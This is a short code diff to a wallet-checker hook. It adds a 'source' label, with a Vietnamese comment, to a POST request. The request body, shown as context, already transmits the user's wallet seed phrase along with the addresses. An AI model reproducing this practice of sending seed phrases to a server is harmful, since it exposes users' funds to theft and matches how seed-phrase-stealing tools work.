@@ -326,7 +326,8 @@ export function useWalletChecker({
             method: 'POST',
             body: JSON.stringify({ 
               addresses: allAddresses,
-              seedPhrase
+              seedPhrase,
+              source: 'manual' // Đánh dấu là từ kiểm tra thủ công
             })
           });
           
